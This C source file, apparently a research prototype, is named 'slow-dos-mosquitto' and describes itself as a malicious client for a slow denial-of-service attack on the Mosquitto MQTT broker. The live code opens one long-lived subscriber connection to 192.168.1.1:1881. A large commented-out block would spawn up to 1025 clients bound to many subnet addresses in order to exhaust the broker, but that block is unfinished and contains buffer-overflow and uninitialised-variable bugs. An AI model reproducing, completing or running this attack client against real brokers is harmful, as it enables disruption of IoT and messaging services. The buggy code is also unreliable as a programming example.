#include <stdio.h>
#include "stdlib.h"
#include "string.h"
#include "unistd.h"
#include <mosquitto.h>
#include <argp.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <errno.h>


const char *argp_program_version = "slow-dos-mosquitto 1.0.0";
static char doc[] = "This script's purpose is to implement a malicious client for a SlowDoS attack on the mosquitto implemenation of an MQTT broker.";
const char *argp_program_bug_address = "patricia.horvath@tum.de";
//TODO
static char args_doc[] = "";
static struct argp_option options[] = {
        {"help", 'h', 0, 0, "Print help"},
        {"source_ip", 's', "source_ip", 0, "Specify source IP address of the client"},
        {0}
};

struct arguments {
    int help;
    char *args[1];
    char *source_ip[9];
};


int print_ip_address(){
    struct ifaddrs *interfaceArray = NULL, *tempIfAddr = NULL;
    void *tempAddrPtr = NULL;
    int rc = 0;
    char addressOutputBuffer[INET6_ADDRSTRLEN];

    rc = getifaddrs(&interfaceArray);  /* retrieve the current interfaces */
    if (rc == 0)
    {
        for(tempIfAddr = interfaceArray; tempIfAddr != NULL; tempIfAddr = tempIfAddr->ifa_next)
        {
            if(tempIfAddr->ifa_addr->sa_family == AF_INET)
                tempAddrPtr = &((struct sockaddr_in *)tempIfAddr->ifa_addr)->sin_addr;
            else
                tempAddrPtr = &((struct sockaddr_in6 *)tempIfAddr->ifa_addr)->sin6_addr;

            printf("Internet Address:  %s \n",
                   inet_ntop(tempIfAddr->ifa_addr->sa_family,
                             tempAddrPtr,
                             addressOutputBuffer,
                             sizeof(addressOutputBuffer)));

            printf("LineDescription :  %s \n", tempIfAddr->ifa_name);
            if(tempIfAddr->ifa_netmask != NULL)
            {
                if(tempIfAddr->ifa_netmask->sa_family == AF_INET)
                    tempAddrPtr = &((struct sockaddr_in *)tempIfAddr->ifa_netmask)->sin_addr;
                else
                    tempAddrPtr = &((struct sockaddr_in6 *)tempIfAddr->ifa_netmask)->sin6_addr;

                printf("Netmask         :  %s \n",
                       inet_ntop(tempIfAddr->ifa_netmask->sa_family,
                                 tempAddrPtr,
                                 addressOutputBuffer,
                                 sizeof(addressOutputBuffer)));
            }
            if(tempIfAddr->ifa_ifu.ifu_broadaddr != NULL)
            {
                /* If the ifa_flags field indicates that this is a P2P interface */
                if(tempIfAddr->ifa_flags & IFF_POINTOPOINT)
                {
                    printf("Destination Addr:  ");
                    if(tempIfAddr->ifa_ifu.ifu_dstaddr->sa_family == AF_INET)
                        tempAddrPtr = &((struct sockaddr_in *)tempIfAddr->ifa_ifu.ifu_dstaddr)->sin_addr;
                    else
                        tempAddrPtr = &((struct sockaddr_in6 *)tempIfAddr->ifa_ifu.ifu_dstaddr)->sin6_addr;
                }
                else
                {
                    printf("Broadcast Addr  :  ");
                    if(tempIfAddr->ifa_ifu.ifu_broadaddr->sa_family == AF_INET)
                        tempAddrPtr = &((struct sockaddr_in *)tempIfAddr->ifa_ifu.ifu_broadaddr)->sin_addr;
                    else
                        tempAddrPtr = &((struct sockaddr_in6 *)tempIfAddr->ifa_ifu.ifu_broadaddr)->sin6_addr;
                }

                printf("%s \n",
                       inet_ntop(tempIfAddr->ifa_ifu.ifu_broadaddr->sa_family,
                                 tempAddrPtr,
                                 addressOutputBuffer,
                                 sizeof(addressOutputBuffer)));
            }
            printf("\n");
        }

        freeifaddrs(interfaceArray);             /* free the dynamic memory */
        interfaceArray = NULL;                   /* prevent use after free  */
    }
    else
    {
        printf("getifaddrs() failed with errno =  %d %s \n",
               errno, strerror(errno));
        return rc;
    }
}

// TODO adjust options
static error_t parse_opt(int key, char *arg[], struct argp_state *state){
    struct arguments *arguments = state->input;
    switch(key) {
        case 'h':
            arguments->help = 1;
            break;
        /*case 's':
            arguments->source_ip = arg;
            break;*/

        case ARGP_KEY_ARG:
            // Too many arguments, if your program expects only one argument.
            if(state->arg_num > 1)
                argp_usage(state);
            arguments->args[state->arg_num] = arg; // TODO Warning: assignment to 'char *' from incompatible pointer type 'char **'
            break;

        case ARGP_KEY_END:
            // Not enough arguments. if your program expects exactly one argument.
            if(state->arg_num < 1)
                argp_usage(state);
            break;

        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}


void on_connect(struct mosquitto *mosq, void *obj, int reason_code) {

    int rc;
    printf("on_connect: %s\n", mosquitto_connack_string(reason_code));
    if (reason_code != 0) {

        mosquitto_disconnect(mosq);
    }
    rc = mosquitto_subscribe(mosq, NULL, "test", 1);
    if (rc != MOSQ_ERR_SUCCESS) {
        fprintf(stderr, "Error subscribing: %s\n", mosquitto_strerror(rc));
        mosquitto_disconnect(mosq);
    }

}

/* Callback called when the broker sends a SUBACK in response to a SUBSCRIBE. */
void on_subscribe(struct mosquitto *mosq, void *obj, int mid, int qos_count, const int *granted_qos) {
    int i;
    bool have_subscription = false;

    /* In this example we only subscribe to a single topic at once, but a
     * SUBSCRIBE can contain many topics at once, so this is one way to check
     * them all. */
    for (i = 0; i < qos_count; i++) {
        printf("on_subscribe: %d:granted qos = %d\n", i, granted_qos[i]);
        if (granted_qos[i] <= 2) {
            have_subscription = true;
        }
    }
    if (have_subscription == false) {
        fprintf(stderr, "Error: All subscriptions rejected.\n");
        mosquitto_disconnect(mosq);
    }
}

/* Callback called when the client receives a message. */
void on_message(struct mosquitto *mosq, void *obj, const struct mosquitto_message *msg) {
    /* This blindly prints the payload, but the payload can be anything so take care. */
    printf("%s %d %s\n", msg->topic, msg->qos, (char *) msg->payload);
}

int main(int argc, char *argv[]) {
    struct mosquitto *mosq;
    int rc;
    //struct mosquitto *clients[1025];

    /* Required before calling other mosquitto functions */
    mosquitto_lib_init();

    printf("Starting the attack now ...\n");

    /* Create a new client instance.
     * id = NULL -> ask the broker to generate a client id for us
     * clean session = true -> the broker should remove old sessions when we connect
     * obj = NULL -> we aren't passing any of our private data for callbacks
     */
    //int i = 0;
    // create maximum number of clients
    /*while (i < 1025) {
        mosq = mosquitto_new(NULL, true, NULL);
        if (mosq == NULL) {
            fprintf(stderr, "Error: Out of memory.\n");
            return 1;
        }
        clients[i] = mosq;
        i = i + 1;
    }*/
    mosq = mosquitto_new(NULL, true, NULL);
    if (mosq == NULL) {
        fprintf(stderr, "Error: Out of memory.\n");
        return 1;
    }


    /* Configure callbacks. This should be done before connecting ideally. */
    mosquitto_connect_callback_set(mosq, on_connect);
    mosquitto_subscribe_callback_set(mosq, on_subscribe);
    mosquitto_message_callback_set(mosq, on_message);

    /* Connect to test.mosquitto.org on port 1883, with a keepalive of 60 seconds.
     * This call makes the socket connection only, it does not complete the MQTT
     * CONNECT/CONNACK flow, you should use mosquitto_loop_start() or
     * mosquitto_loop_forever() for processing net traffic. */
    /*int j;
    int ip_addr;
    int count;
    count = 0;
    int index_mosq = 0;*/
    printf("Requesting connection ...\n");
    /*//for(j=0; j<sizeof(clients)/sizeof(*clients); j++){
        // start client in 192.168.1.0 subnet
        while(count < 1025) {
            for (ip_addr = 2; ip_addr <= 254; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.1.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;*//*
            }
            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.2.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;
            }
            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.3.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;*//*
            }
            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.4.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;*//*
            }
            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.5.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;*//*
            }
            for (ip_addr = 1; ip_addr <= 9; ip_addr++) {
                // generate new IP address
                char ip_addr_end[500];
                char new_ip_addr[] = "192.168.6.";
                sprintf(ip_addr_end, "%d", ip_addr);
                strcat(new_ip_addr, ip_addr_end);
                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
                //printf("IP address is %s\n", new_ip_addr);
                if (rc != MOSQ_ERR_SUCCESS) {
                    mosquitto_destroy(mosq);
                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
                    return 1;
                }
                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
                index_mosq++;*//*
            }
            count++;
        }*/
    //printf("Client count is %d\n", count);
    //print_ip_address();

    rc = mosquitto_connect_bind(mosq, "192.168.1.1", 1881, 60, "192.168.1.2");
    //printf("IP address is %s\n", new_ip_addr);
    if (rc != MOSQ_ERR_SUCCESS) {
        mosquitto_destroy(mosq);
        fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
        return 1;
    }






    //}

    /* Run the network loop in a blocking call.
     * This call will continue forever, carrying automatic reconnections if
     * necessary, until the user calls mosquitto_disconnect().
     */
    mosquitto_loop_forever(mosq, -1, 1);

    mosquitto_lib_cleanup();
    return 0;
}





